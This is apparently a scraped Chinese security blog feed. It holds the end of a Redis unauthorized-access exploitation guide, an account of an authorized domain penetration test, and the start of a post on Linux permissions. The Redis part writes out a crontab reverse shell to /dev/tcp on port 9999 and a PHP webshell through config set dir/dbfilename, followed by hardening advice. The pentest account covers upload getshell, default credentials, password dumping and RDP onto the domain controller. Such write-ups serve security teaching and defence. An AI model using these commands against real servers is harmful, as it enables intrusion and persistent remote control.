src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AB%AF%E5%8F%A3%E7%9B%91%E5%90%AC.png" alt="此处输入图片的描述"></p><h5 id="2-设置某一个键的值为符合-crontable-格式的反弹-shell-一句话"><a href="#2-设置某一个键的值为符合-crontable-格式的反弹-shell-一句话" class="headerlink" title="2.设置某一个键的值为符合 crontable 格式的反弹 shell 一句话"></a><strong>2.设置某一个键的值为符合 crontable 格式的反弹 shell 一句话</strong></h5><pre><code class="hljs">set hacker &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/9999 0&gt;&amp;1\n\n&quot;</code></pre><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BE%E7%BD%AE%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1.png" alt="此处输入图片的描述"></p><h5 id="3-改变路径和文件名为-var-spool-cron-root"><a href="#3-改变路径和文件名为-var-spool-cron-root" class="headerlink" title="3.改变路径和文件名为 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root"></a><strong>3.改变路径和文件名为 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</strong></h5><pre><code class="hljs">config set dir /var/spool/cronconfig set dbfilename rootsave</code></pre><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BE%E7%BD%AE%20cron%20%E8%B7%AF%E5%BE%84.png" alt="此处输入图片的描述"></p><h5 id="4-等待"><a href="#4-等待" class="headerlink" title="4.等待"></a><strong>4.等待</strong></h5><p>这里解释一下为什么要写成 root 因为&#x2F;var&#x2F;spool&#x2F;cron&#x2F; 这个目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名，比如tom建的crontab任务对应的文件就是&#x2F;var&#x2F;spool&#x2F;cron&#x2F;tom。一般一个用户最多只有一个crontab文件。</p><h4 id="5-利用-Redis-写-webshell"><a href="#5-利用-Redis-写-webshell" class="headerlink" title="5. 利用 Redis 写 webshell"></a><strong>5. 利用 Redis 写 webshell</strong></h4><h5 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a><strong>1.概述</strong></h5><p>我一开始也说了， redis 和 memcached 的很大区别就在于他能将数据持久化存储(虽然两个的侧重点都在缓存而不是将数据存储在硬盘上，但是他就是支持)，这个性质对我们来说是非常好的，我们可以利用这个写入磁盘的性质实现 写入我们的 shell </p><p>我之前提到了 <strong>RDB</strong> 和 <strong>AOF</strong> 这两个机制就是我们写文件的基础，RDB 像一个数据库备份文件，而AOF是一个log日志文件。我们可以设置让 redis 在指定时间、指定更改次数时进行备份，生成RDB文件；而设置AOF，可以在操作或时间过程后将“日志”写入一个文件的最末，当操作越来越多，则AOF文件越来越大。二者是相辅相成的，通过二者的配合我们能够稳定地持久地将数据存储于服务器上。</p><h5 id="2-测试"><a href="#2-测试" class="headerlink" title="2.测试"></a><strong>2.测试</strong></h5><p>这个 webshell 的写入方法非常的类似于 MYSQL 利用  general log 写 shell 的方式，如果你还不了解 mysql 的写入 shell 的方式 可以参考我的这篇文章 ：<a href="http://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/">Mysql 在渗透测试中的利用</a></p><h5 id="1-写入-webshell"><a href="#1-写入-webshell" class="headerlink" title="1.写入 webshell"></a><strong>1.写入 webshell</strong></h5><pre><code class="hljs">127.0.0.1:6379&gt; config set dir E:/phpstudy/PHPTutorial/WWW/OK127.0.0.1:6379&gt; config set dbfilename redis.phpOK127.0.0.1:6379&gt; set webshell &quot;&lt;?php phpinfo();?&gt;&quot;OK</code></pre><h4 id="2-访问测试"><a href="#2-访问测试" class="headerlink" title="2.访问测试"></a><strong>2.访问测试</strong></h4><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%99shell.png" alt="此处输入图片的描述"></p><h2 id="0X07-如何防御"><a href="#0X07-如何防御" class="headerlink" title="0X07 如何防御"></a><strong>0X07 如何防御</strong></h2><h3 id="方法一：禁用高危命令（重启redis才能生效）"><a href="#方法一：禁用高危命令（重启redis才能生效）" class="headerlink" title="方法一：禁用高危命令（重启redis才能生效）"></a><strong>方法一：禁用高危命令（重启redis才能生效）</strong></h3><p>在 redis.conf 文件中直接将危险命令置空，或者改变其名字</p><pre><code class="hljs">rename-command FLUSHALL &quot;&quot;rename-command CONFIG &quot;&quot;rename-command EVAL &quot;&quot;</code></pre><p>或者</p><pre><code class="hljs">rename-command FLUSHALL &quot;name1&quot;rename-command CONFIG &quot;name2&quot;rename-command EVAL &quot;name3&quot;</code></pre><h3 id="方法二：以低权限运行-Redis-服务（重启redis才能生效）"><a href="#方法二：以低权限运行-Redis-服务（重启redis才能生效）" class="headerlink" title="方法二：以低权限运行 Redis 服务（重启redis才能生效）"></a><strong>方法二：以低权限运行 Redis 服务（重启redis才能生效）</strong></h3><p>我们知道进程的权限就是启动进程用户的权限，所以我们单独给 redis 开一个用户，这样不是 root 很多的操作都不能做了（方法类似于 apache 的降权运行防止 getshell 以后删除整站）</p><pre><code class="hljs">groupadd -r redis   useradd -r -g redis redis</code></pre><h3 id="方法三：为-Redis-添加密码验证（重启redis才能生效）"><a href="#方法三：为-Redis-添加密码验证（重启redis才能生效）" class="headerlink" title="方法三：为 Redis 添加密码验证（重启redis才能生效）"></a><strong>方法三：为 Redis 添加密码验证（重启redis才能生效）</strong></h3><p>我觉得这个方法是最最核心的，因为默认的密码是空，然后不改的话就是直接被打</p><p>修改 redis.conf 文件，添加</p><pre><code class="hljs">requirepass mypassword</code></pre><h3 id="方法四：禁止外网访问-Redis（重启redis才能生效）"><a href="#方法四：禁止外网访问-Redis（重启redis才能生效）" class="headerlink" title="方法四：禁止外网访问 Redis（重启redis才能生效）"></a><strong>方法四：禁止外网访问 Redis（重启redis才能生效）</strong></h3><p>这个措施配合设置密码，一般来讲就没有什么大的问题， 就怕这个设置了结果密码没设置，万一出了 SSRF 照打不误</p><p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用（<strong>当然你设置成当前主机可用的话，安全性就更高了</strong>）</p><pre><code class="hljs">bind 127.0.0.1</code></pre><blockquote><p><strong>注意：</strong></p><p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</p></blockquote><h3 id="方法五：修改默认端口"><a href="#方法五：修改默认端口" class="headerlink" title="方法五：修改默认端口"></a><strong>方法五：修改默认端口</strong></h3><p>这个方式就是不给攻击者试探的机会，反正就是增大了测试的难度</p><p>修改配置文件redis.conf文件</p><pre><code class="hljs">Port 6379</code></pre><h3 id="方法五：设置文件的隐藏属性"><a href="#方法五：设置文件的隐藏属性" class="headerlink" title="方法五：设置文件的隐藏属性"></a><strong>方法五：设置文件的隐藏属性</strong></h3><p>我们上面的利用中有一个利用的是修改 authorized_keys ，为了避免这种情况，我们需要控制这个文件无法被篡改，这就涉及到 Linux 中的文件的隐藏属性的知识点</p><h4 id="两个比较重要的命令："><a href="#两个比较重要的命令：" class="headerlink" title="两个比较重要的命令："></a><strong>两个比较重要的命令：</strong></h4><pre><code class="hljs">chattr：change file attributeslsattr：list file attributes</code></pre><h4 id="两个比较重要的参数："><a href="#两个比较重要的参数：" class="headerlink" title="两个比较重要的参数："></a><strong>两个比较重要的参数：</strong></h4><h5 id="a-参数："><a href="#a-参数：" class="headerlink" title="a 参数："></a><strong>a 参数：</strong></h5><p>设置了a参数时，文件中将只能增加内容，不能删除数据，且不能打开文件进行任何编辑，哪怕是追加内容也不可以，所以像sed等需要打开文件的再写入数据的工具也无法操作成功。文件也不能被删除。只有root才能设置。</p><h5 id="i-参数："><a href="#i-参数：" class="headerlink" title="i 参数："></a><strong>i 参数：</strong></h5><p>设置了i参数时，文件将被锁定，不能向其中增删改内容，也不能删除修改文件等各种动作。只有root才能设置。可以将其理解为设置了i后，文件将是永恒不变的了，谁都不能动它。</p><p>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：</p><pre><code class="hljs">chmod 400 ~/.ssh/authorized_keys</code></pre><p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限:</p><pre><code class="hljs">chattr +i ~/.ssh/authorized_keys</code></pre><p>然而，用户还可以重命名 ~&#x2F;.ssh，然后新建新的 ~&#x2F;.ssh 目录和 authorized_keys<br>文件。要避免这种情况，需要设置 ~.&#x2F;ssh 的 immutable 权限：</p><pre><code class="hljs">chattr +i ~/.ssh</code></pre><h3 id="方法六：设置防火墙策略"><a href="#方法六：设置防火墙策略" class="headerlink" title="方法六：设置防火墙策略"></a><strong>方法六：设置防火墙策略</strong></h3><p>如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务</p><h2 id="0X07-总结"><a href="#0X07-总结" class="headerlink" title="0X07 总结"></a><strong>0X07 总结</strong></h2><p>本文主要是简单的介绍了一下 redi 并与其他类型数据库做了一些对比，利用 redis 能持久化存储的特性并结合 redis 的未授漏洞，尝试了几种不同的攻击方式，纸上得来终觉浅，绝知此事要躬行啊。 </p><h2 id="0X08-参考"><a href="#0X08-参考" class="headerlink" title="0X08 参考"></a><strong>0X08 参考</strong></h2><p><a href="https://www.jb51.net/article/118777.htm">https://www.jb51.net/article/118777.htm</a><br><a href="https://www.freebuf.com/column/158065.html">https://www.freebuf.com/column/158065.html</a><br><a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Redis 备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次真实的域渗透经历(从文件上传到拿下整个域控)</title>
    <link href="/2018/11/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%9A%84%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%8F%E5%8E%86/"/>
    <url>/2018/11/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%9A%84%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%8F%E5%8E%86/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>这是一次真实域渗透的记录，是在上个期末考试前一段时间完成的，距现在也有几个月了吧，但是由于漏洞的修复以及一些隐私的涉及，我没有立刻写这篇文章并发出来，这里面没有太多的高大上的漏洞利用技巧可言，写这篇文章的目的就是想展现一个真实域环境的渗透过程。</p><h2 id="0X01-发现上传点"><a href="#0X01-发现上传点" class="headerlink" title="0X01 发现上传点"></a><strong>0X01 发现上传点</strong></h2><h3 id="1-上传点中的玄学"><a href="#1-上传点中的玄学" class="headerlink" title="1.上传点中的玄学"></a><strong>1.上传点中的玄学</strong></h3><p>事情的起因是另一个师傅发现了一个上传点，然后我们就一起玩了起来，不过说实话，整个 getshell 的过程异常神奇，或许这就是实战中的玄学吧</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%91%E7%8E%B0%E4%B8%8A%E4%BC%A0%E7%82%B91.png" alt="此处输入图片的描述"></p><span id="more"></span><p>扫了一下目录，发现upload 目录能访问，我就去看了一下，结果如下</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%91%E7%8E%B0%E4%B8%8A%E4%BC%A0%E7%82%B92.png" alt="此处输入图片的描述"></p><p>发现不仅有列目录漏洞还发现了一个 default.aspx，访问一下看看</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%91%E7%8E%B0%E4%B8%8A%E4%BC%A0%E7%82%B93.png" alt="此处输入图片的描述"></p><h3 id="2-文件上传-getshell"><a href="#2-文件上传-getshell" class="headerlink" title="2.文件上传 getshell"></a><strong>2.文件上传 getshell</strong></h3><p>我去，这也太真实了吧，真实环境就是这么脆弱(当然这是因为找的是一个大网站的一个非常小的子域名进行的挖掘，要不然也不会有后面的域渗透了)</p><p>然后就是尝试上传文件，我发现上传的内容会被放在 file 目录下，更加神奇的就是 file 目录居然能解析 aspx 文件，这简直就是在送网站，我当然也不能放过这次机会，这时候就出现了两种选择，一种就是直接上传一句话然后用菜刀，但是我觉得对于这种运行 IIS 的 windows 的系统来讲，想要更加直观地获取更多的信息(比如判断内网，扫描端口等)最好的方式还是传一个大马上去，于是我就直接上传了一个经典的大马拿到了 shell</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8F%91%E7%8E%B0%E4%B8%8A%E4%BC%A0%E7%82%B94.png" alt="此处输入图片的描述"></p><h2 id="0X02-信息收集"><a href="#0X02-信息收集" class="headerlink" title="0X02 信息收集"></a><strong>0X02 信息收集</strong></h2><p>注意大马的左上角的 ip 地址，看到这里我浑身的血都沸腾了，有内网！终于能在现实中来一波域渗透了。</p><h3 id="1-端口扫描："><a href="#1-端口扫描：" class="headerlink" title="1.端口扫描："></a><strong>1.端口扫描：</strong></h3><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F.png" alt="此处输入图片的描述"></p><p>可以看到开了 3389 ，这时候其实我们心里已经大概有数了，如果这个 3389 对外开放，那么我们拿到用户名密码以后就直接远程桌面</p><h3 id="2-系统信息"><a href="#2-系统信息" class="headerlink" title="2. 系统信息"></a><strong>2. 系统信息</strong></h3><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/systeminfo.png" alt="此处输入图片的描述"></p><p>看到 服务器是 IIS 7.5 ,这明显是一个存在多个漏洞的版本，但是却没怎么用到，我已经进来了，然后我又输入了 systeminfo 命令，发现这台主机是 Windows server 2008 r2 ,这里就不放图了</p><h3 id="3-其他信息"><a href="#3-其他信息" class="headerlink" title="3.其他信息"></a><strong>3.其他信息</strong></h3><p>我还通过大马本身的功能大致浏览了一下其他一些零零碎碎的信息</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/admin.png" alt="此处输入图片的描述"></p><p>还有我发现了其实这个机器是一个 VM 的虚拟机</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/vm.png" alt="此处输入图片的描述"></p><p>其实现在企业大部分的内网都是一个又一个的虚拟机，这也是很正常的</p><h3 id="4-ipconfig-all"><a href="#4-ipconfig-all" class="headerlink" title="4.ipconfig &#x2F;all"></a><strong>4.ipconfig &#x2F;all</strong></h3><p>在拥有了该台主机的用户信息、端口信息、主机信息以后，我还要做的就是进行横向的扩展，因为这台主机在内网中，我需要知道更多，我想判断内网的情况，于是 ipconfig 这个命令首先映入脑海</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/ipconfig.png" alt="此处输入图片的描述"></p><p><strong>我们重点看几个位置：</strong></p><p>(1)DNS 服务器：实际上如果你有一定的域渗透经验，你就会知道域控往往就是 DNS 服务器，所以我就首先将域控的范围放在 10.1.30.8 和 10.1.30.250 ，并且你还要能看到这个 ip 段已经不再是我们看到的这台主机的 ip 段 10.1.8 段了，而是直接跳到了 10.1.30 段，我当时就预感到这个内网的庞大</p><p>(2)DNS 后缀：这能帮助我们知道我们这台机器在哪个域中，因为很明显我们已经知道这个域不是单一的域，而是一个林</p><h3 id="4-arp-a"><a href="#4-arp-a" class="headerlink" title="4.arp -a"></a><strong>4.arp -a</strong></h3><p>在没有进行内网扫描以前，使用 arp -a 进行简单的判断是非常必要的，于是我也进行了尝试</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/arp-a.png" alt="此处输入图片的描述"></p><p>可以看到这个段的主机也是非常的多的</p><h3 id="5-net-view-domain"><a href="#5-net-view-domain" class="headerlink" title="5.net view (&#x2F;domain)"></a><strong>5.net view (&#x2F;domain)</strong></h3><p>已经确认了域了，我们就可以看一下当前域的主机有哪些（因为涉及到公司的隐私，我无法将主机名完整的呈现出来，但是我留出了关键的部分，那个 xxxx-new,如果你仔细看上面的图的话，你会发现当前主机的主机名就是 xxx-new）</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/net-view1.png" alt="此处输入图片的描述"></p><p>当然我还想看一下有哪些域，这时候可以使用  </p><pre><code class="hljs">net view /domain</code></pre><p>这里我发现了两个域，同样因为隐私，我就不贴图片了，但是你要知道，其中一定有一个域的名字和我们上面看到的 dns 后缀名是一样的。</p><h3 id="6-内网主机扫描"><a href="#6-内网主机扫描" class="headerlink" title="6.内网主机扫描"></a><strong>6.内网主机扫描</strong></h3><p>在大致了解了内网的域的情况以后，我选择了对内网的范围进行扫描，由于是在内网，自然需要内网穿透工具的使用，这里我使用的是 reGeorg+Proxifier 渗透内网 具体的使用方法可以参考我的<a href="http://www.k0rz3n.com/2018/07/06/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8reGeorg+Proxifier%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91/">这篇文章</a></p><p>挂了代理以后，我这台笔记本就顺理成章地成为了他们内网主机的一员，我选择使用图形化界面的 nmap 开扫</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F.png" alt="此处输入图片的描述"></p><p>可以看到主机大多数都是 2003 和 2008 的并且 445 都开着，那我要是现在有个勒索病毒是吧，整个内网就炸了，可见内网的脆弱性不是你想的那么简单</p><p>当然除了使用这种方法以外，为了获得更多的信息，我使用了一些有关网络请求的命令，例如 ping  nslookup tracert 等，最后还是有了新的发现，在我 nslookup 域控的时候我又发现了更大的内网范围 10.2.32 段，这个有点大，我有点紧张，现在已经跑到了 10.x 段了，这的有多少啊。。。</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/nslookup.png" alt="此处输入图片的描述"></p><h3 id="7-社会工程"><a href="#7-社会工程" class="headerlink" title="7.社会工程"></a><strong>7.社会工程</strong></h3><p>除了这些硬家伙以外，在渗透过程中的软实力也不能少，我大概通过菜刀翻阅了一下这个网站的目录，果然被我发现了一个手册，手册里面写着这个网站某个页面的示例用户名和密码，我一看就乐了，绝对有人就是直接用的这个手册给的用户名和密码（懒啊）</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%BB%98%E8%AE%A4%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81.png" alt="此处输入图片的描述"></p><p>然后我就真的到了这个网站的对应页面，输入了 U1234 和 168168 真的进去了，我笑了</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81%E7%99%BB%E5%85%A5.png" alt="此处输入图片的描述"></p><p>然后又是一番探索，我发现了更多的网段</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%9B%B4%E5%A4%9A%E7%9A%84%E7%BD%91%E6%AE%B5.png" alt="此处输入图片的描述"></p><p>除此之外还有很多的用户名信息等，他们的在线情况我都一目了然</p><h2 id="0X03-提权干3389"><a href="#0X03-提权干3389" class="headerlink" title="0X03 提权干3389"></a><strong>0X03 提权干3389</strong></h2><p>收集了这么多信息，其实就是想弄清楚我面对的内网的样子，大致的拓扑结构，但是对于 windows 系统，我最希望的还是上 3389 看一看，这里其实就是提权了，当然这里我使用的方法并不是提权而是社工(当然我也尝试了在大马中直接提权，也是成功的)</p><p>先看下当前用户吧</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%A4%BE%E5%B7%A5%E7%8C%9C3389.png" alt="此处输入图片的描述"></p><p>我们发现这台主机除了 administrator 用户以外在 admin 用于组中还有一个颇为神奇的用户叫做 bibo ，更为神奇的是他的密码也是 bibo（按理讲 windows server 2008 是不允许设置这种简单密码的，我真不知道这个是怎么实现的） ，于是我又笑了</p><p>其实我就这样进去了，但是为了说明一下提权，我也做了尝试</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%8F%90%E6%9D%83.png" alt="此处输入图片的描述"></p><p>进去以后先看了一下基本的信息</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF1.png" alt="此处输入图片的描述"></p><p>可以看到我们就是在之前我们所说的那个域里面</p><p>再看一下网络信息</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF2.png" alt="此处输入图片的描述"></p><p>我发现这个内网是没有直接连接外网的，也就是无法从这台主机向外网发起请求，实际上这部分信息在信息收集部分我也做了，使用 ping 外网地址的方式试探</p><h2 id="0X04-横向渗透"><a href="#0X04-横向渗透" class="headerlink" title="0X04 横向渗透"></a><strong>0X04 横向渗透</strong></h2><p>拿了一台主机这么能满足我的热血？肯定要横向渗透，这横向渗透利用到到一定的社工以及信息收集的方法</p><h3 id="1-找同一个管理员控制的主机"><a href="#1-找同一个管理员控制的主机" class="headerlink" title="1.找同一个管理员控制的主机"></a><strong>1.找同一个管理员控制的主机</strong></h3><p>我们知道不可能一个管理员只控制一台主机，往往是控制多台的，于是在使用  win + r 的时候自然而然就会留下输入的记录，于是我就特地看了一下，然后真的有发现</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F1.png" alt="此处输入图片的描述"></p><p>我发现了 10.1.8.22 主机，根据我之前你的分析也台主机很有可能也是这个管理员一手管理，我尝试登录</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BB%E5%BD%9522.png" alt="此处输入图片的描述"></p><p>登陆成功以后，我重复了之前的步骤，对其进行了有一番信息收集， </p><h3 id="2-找域控-web-管理页面"><a href="#2-找域控-web-管理页面" class="headerlink" title="2.找域控 web 管理页面"></a><strong>2.找域控 web 管理页面</strong></h3><p>往往在域控中会有一个 web 管理界面，这个界面也是方便管理员对整个域进行管理的，其实这个也是在我上传了局域网扫描器进行了详细的扫描以后发现的，原来我也不是很清楚有这个东西，并且它的密码默认是写在输入框里面的，可能是因为是内网？我也不懂</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/AD1.png" alt="此处输入图片的描述"></p><p>然后我就进去看了看，当看到计算机和用户的数量的时候有点害怕。。</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/AD2_.png" alt="此处输入图片的描述"></p><p>我还明显的看到一共有5个域控，而不是我之前找到的两个，也就是说，整个内网的环境非常的大，比我想的要大得多得多</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/AD3.png" alt="此处输入图片的描述"></p><h2 id="0X05-拿下域控"><a href="#0X05-拿下域控" class="headerlink" title="0X05 拿下域控"></a><strong>0X05 拿下域控</strong></h2><p>到此为止实际上整个域已经被我拿下来了，但是还有一点不足，我还没通过 3389 登域控服务器呢！怎么登，密码是啥，还是逃不掉啊，我还是要运行 dump 密码的工具先看看</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%9F%9F%E6%8E%A7%E5%AF%86%E7%A0%81.png" alt="此处输入图片的描述"></p><p>我顺利地拿到了 administrator 的密码，但是这其实并不一定是域控的密码，但是还是要试一试，毕竟从这个域的管理员的习惯来看，太有可能了</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A81.png" alt="此处输入图片的描述"></p><p>好了，成功3389 登录域控服务器，到此为止一切都结束了。</p><h2 id="0X06-总结"><a href="#0X06-总结" class="headerlink" title="0X06 总结"></a><strong>0X06 总结</strong></h2><p>这篇文章没有太多渗透的奇淫技巧，但是全篇文章完整的记录了我渗透的大致过程，整个渗透由点及面，涉及最基本的信息收集、社工、提权等，但由于是几个月之前的截图，现在又拿出来整理写成这篇文章，过程难免有些疏漏，还望大家指正。<strong>另外这次的渗透是我与另一个师傅一起，属于授权渗透，我在写文章的过程中也非常注意敏感信息的隐藏，目前漏洞已经修复。还请大家不要在没有经过授权的情况下随意的测试大公司的网站，以免背负不必要的法律责任。</strong></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全 渗透测试 内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于 Shell 权限的一些探究</title>
    <link href="/2018/11/07/%E5%85%B3%E4%BA%8E%20Shell%20%E6%9D%83%E9%99%90%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8E%A2%E7%A9%B6/"/>
    <url>/2018/11/07/%E5%85%B3%E4%BA%8E%20Shell%20%E6%9D%83%E9%99%90%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8E%A2%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>几个月之前写的那篇 <a href="http://www.k0rz3n.com/2018/05/17/%E6%90%AD%E5%BB%BAdocker%E7%9A%84%20CTF%20getshell%E7%8E%AF%E5%A2%83/">搭建docker的 CTF getshell环境</a> 由于其中写了一句：“因为这里涉及到权限的问题，比较复杂，我会更新这篇文章或者新开一篇文章”，期间也有很多人问我这个问题，于是还是决定亲自再测试一下，搞一搞这里面权限应该怎么设置，为什么要这样设置，也算是给自己和他人一个交代，谁让我承诺了呢？</p><h2 id="0X01-Linux下的权限管理"><a href="#0X01-Linux下的权限管理" class="headerlink" title="0X01 Linux下的权限管理"></a><strong>0X01 Linux下的权限管理</strong></h2><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a><strong>1.基本概念</strong></h3><p>权限是操作系统用来限制资源访问的机制，权限一般分为读、写、执行。Linux 系统中每个文件都拥有自己所属用户及所属组，并且通过10个字符表明了那些用户和用户组能有权对该文件进行哪些操作。</p><span id="more"></span><blockquote><p><strong>注意：</strong></p><p>(1)每个进程都是以某个用户的身份运行，所以进程的权限与该用户的权限一样，用户的权限越大，该进程所拥有的权限也就越大。<br>(2)文件的所属用户就是创建文件的用户(或者说创建文件的进程所属的用户)，文件的所属组就是文件的所属用户所在的组<br>(3)如果我们无法改变用户的访问权限(实际上通常情况下无法改变)，我们控制权限的实质实际上就转化成了改变文件的所属，这样其他用户组的用户就对该文件没有了访问权限<br>(4)Linux 中每一个用户都必须属于一个用户组，无一例外</p></blockquote><h3 id="2-常用的命令"><a href="#2-常用的命令" class="headerlink" title="2.常用的命令"></a><strong>2.常用的命令</strong></h3><p>我们在Linux 中有一些比较常用的查看当前进程所属用户和用户组的命令</p><h4 id="1-cat-etc-group"><a href="#1-cat-etc-group" class="headerlink" title="1.cat &#x2F;etc&#x2F;group"></a><strong>1.cat &#x2F;etc&#x2F;group</strong></h4><p>查看当前有哪些用户组存在</p><pre><code class="hljs">root@8235174cc513:/var/www/html# cat /etc/grouproot:x:0:daemon:x:1:bin:x:2:sys:x:3:adm:x:4:tty:x:5:disk:x:6:lp:x:7:mail:x:8:news:x:9:uucp:x:10:man:x:12:proxy:x:13:kmem:x:15:dialout:x:20:fax:x:21:voice:x:22:cdrom:x:24:floppy:x:25:tape:x:26:sudo:x:27:audio:x:29:dip:x:30:www-data:x:33:backup:x:34:operator:x:37:list:x:38:irc:x:39:src:x:40:gnats:x:41:shadow:x:42:utmp:x:43:video:x:44:sasl:x:45:plugdev:x:46:staff:x:50:games:x:60:users:x:100:nogroup:x:65534:ssl-cert:x:101:</code></pre><h4 id="2-groups"><a href="#2-groups" class="headerlink" title="2.groups"></a><strong>2.groups</strong></h4><p>查看当前进程所属用户所在的用户组</p><pre><code class="hljs">root@8235174cc513:/var/www/html# groupsroot</code></pre><p>这说明我现在所在的进程的所属用户是 root 组的，如果想看是属于这个组中的什么用户可以使用 whoami </p><pre><code class="hljs">(www-data:/var/www/html) $ groupswww-data</code></pre><p>这个就是说明我启动这个进程的用户所属的组是 www-data</p><p>那比如说我想在 www-data 组中添加一个用户</p><pre><code class="hljs">useradd -g www-data K0rz3n</code></pre><p>然后我们将我们的用户切换到 K0rz3n</p><pre><code class="hljs">su K0rz3n</code></pre><p>然后我们看一下 whoami 和 groups 的结果</p><pre><code class="hljs">$ whoamiK0rz3n$ groupswww-data</code></pre><p>当然我们可以指定用户去查看其所属的用户组</p><pre><code class="hljs">root@8235174cc513:/# groups K0rz3nK0rz3n : www-data</code></pre><blockquote><p><strong>注意：</strong></p><p>除了 groups 以外 id 这个命令也有着和 groups 一样的效果，如下所示</p></blockquote><pre><code class="hljs">root@8235174cc513:/# iduid=0(root) gid=0(root) groups=0(root)root@8235174cc513:/# id 